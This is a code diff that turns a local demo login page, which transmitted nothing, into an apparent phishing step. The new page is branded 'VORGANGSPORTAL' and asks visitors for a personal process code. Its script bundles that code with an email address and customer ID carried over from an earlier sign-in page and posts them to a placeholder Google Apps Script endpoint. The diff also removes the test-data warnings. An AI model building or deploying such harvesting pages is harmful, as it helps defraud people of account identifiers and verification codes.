@@ -1,172 +1,97 @@
 
-
 <!DOCTYPE html>
 <html lang="de">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lokale Testanmeldung</title>
-
-    <style>
-        * {
-            box-sizing: border-box;
-        }
-
-        body {
-            margin: 0;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: #ffffff;
-            font-family: Arial, Helvetica, sans-serif;
-            color: #253044;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 420px;
-            padding: 40px 35px;
-            background: #ffffff;
-            border: 1px solid #e5e8ed;
-            border-radius: 12px;
-            box-shadow: 0 5px 24px rgba(0,0,0,0.06);
-        }
-
-        .brand {
-            text-align: center;
-            font-size: 25px;
-            font-weight: bold;
-            letter-spacing: 1px;
-            margin-bottom: 28px;
-            color: #253044;
-        }
-
-        h1 {
-            font-size: 23px;
-            font-weight: 600;
-            margin: 0 0 12px;
-        }
-
-        .description {
-            font-size: 14px;
-            line-height: 1.5;
-            color: #626d7c;
-            margin-bottom: 25px;
-        }
-
-        label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-
-        input {
-            width: 100%;
-            height: 50px;
-            padding: 0 13px;
-            border: 1px solid #aeb8c5;
-            border-radius: 6px;
-            font-size: 16px;
-            margin-bottom: 20px;
-            outline: none;
-        }
-
-        input:focus {
-            border-color: #3867a8;
-            box-shadow: 0 0 0 2px rgba(56,103,168,0.12);
-        }
-
-        button {
-            width: 100%;
-            height: 48px;
-            border: none;
-            border-radius: 25px;
-            background: #253044;
-            color: white;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        button:hover {
-            background: #354660;
-        }
-
-        .notice {
-            margin-top: 24px;
-            padding: 12px;
-            background: #fff6df;
-            border: 1px solid #ead59b;
-            border-radius: 6px;
-            color: #765b16;
-            font-size: 12px;
-            line-height: 1.5;
-            text-align: center;
-        }
-
-        .footer {
-            margin-top: 22px;
-            text-align: center;
-            font-size: 12px;
-            color: #89919d;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Vorgang bestätigen</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#fff;font-family:Arial,sans-serif;color:#253044}
+.container{width:100%;max-width:420px;padding:40px 35px;border:1px solid #e5e8ed;border-radius:12px;box-shadow:0 5px 24px #0000000f}
+.brand{text-align:center;font-size:24px;font-weight:bold;margin-bottom:30px}
+h1{font-size:23px;margin:0 0 12px}
+p{font-size:14px;line-height:1.5;color:#626d7c;margin-bottom:25px}
+label{display:block;font-size:14px;font-weight:bold;margin-bottom:8px}
+input{width:100%;height:50px;padding:0 13px;border:1px solid #aeb8c5;border-radius:6px;font-size:16px;margin-bottom:20px}
+button{width:100%;height:48px;border:0;border-radius:25px;background:#253044;color:white;font-size:16px;font-weight:bold;cursor:pointer}
+button:disabled{opacity:.6;cursor:wait}
+.notice{font-size:12px;line-height:1.5;color:#626d7c;background:#f4f6f8;padding:12px;border-radius:6px;margin-bottom:20px}
+.footer{text-align:center;font-size:12px;color:#89919d;margin-top:22px}
+</style>
 </head>
-
 <body>
+<main class="container">
+<div class="brand">VORGANGSPORTAL</div>
+<h1>Vorgang bestätigen</h1>
+<p>Bitte geben Sie Ihren persönlichen Vorgangscode ein.</p>
 
-    <main class="container">
+<div class="notice">
+Mit dem Absenden werden Ihre E-Mail-Adresse, Kundenkennung und Ihr Vorgangscode an unsere Vorgangsverwaltung übermittelt.
+</div>
 
-        <div class="brand">Pa</div>
+<form id="form">
+<label for="vorgangscode">Vorgangscode</label>
+<input type="text" id="vorgangscode" autocomplete="off" required>
 
-        <h1>Anmelden</h1>
+<button type="submit" id="submitButton">Vorgang bestätigen</button>
+</form>
 
-        <p class="description">
-            Bitte verwende ausschließlich Testdaten für diese lokale Demonstration.
-        </p>
+<div class="footer">Vorgangsverwaltung</div>
+</main>
 
-        <form id="testForm" autocomplete="off">
+<script>
+const SCRIPT_URL = "DEINE_GOOGLE_APPS_SCRIPT_URL";
 
-           
-            <input
-                type="email"
-                id="email"
-                placeholder="E-Mail Adresse oder Handynummer"
-                required
-            >
+document.getElementById("form").addEventListener("submit", async function(e) {
+    e.preventDefault();
 
-            <input
-                type="password"
-                id="password"
-                placeholder="Passwort"
-                required
-            >
+    const email = sessionStorage.getItem("test_email");
+    const kundenkennung = sessionStorage.getItem("test_kundenkennung");
+    const vorgangscode = document.getElementById("vorgangscode").value.trim();
 
-            <button type="submit">Einloggen</button>
+    if (!email || !kundenkennung) {
+        alert("Bitte beginnen Sie die Vorgangsprüfung erneut.");
+        window.location.href = "signin.html";
+        return;
+    }
 
-        </form>
+    const button = document.getElementById("submitButton");
+    button.disabled = true;
+    button.textContent = "Wird übermittelt...";
 
+    const data = {
+        email: email,
+        kundenkennung: kundenkennung,
+        vorgangscode: vorgangscode
+    };
 
-        <div class="footer">
-            Lokale Testseite
-        </div>
-
-    </main>
-
-    <script>
-        document.getElementById("testForm").addEventListener("submit", function(event) {
-            event.preventDefault();
-
-            // Keine Eingaben speichern oder übertragen.
-            document.getElementById("email").value = "";
-            document.getElementById("password").value = "";
-
-            // Ausschließlich zur lokalen Testseite weiterleiten.
-            window.location.href = "/secure";
+    try {
+        const response = await fetch(SCRIPT_URL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "text/plain;charset=utf-8"
+            },
+            body: JSON.stringify(data)
         });
-    </script>
 
+        const result = await response.json();
+
+        if (!result.success) {
+            throw new Error("Übermittlung fehlgeschlagen");
+        }
+
+        sessionStorage.removeItem("test_email");
+        sessionStorage.removeItem("test_kundenkennung");
+
+        window.location.href = "danke.html";
+
+    } catch (error) {
+        button.disabled = false;
+        button.textContent = "Vorgang bestätigen";
+        alert("Die Übermittlung konnte nicht bestätigt werden. Bitte versuchen Sie es erneut.");
+    }
+});
+</script>
 </body>
 </html>
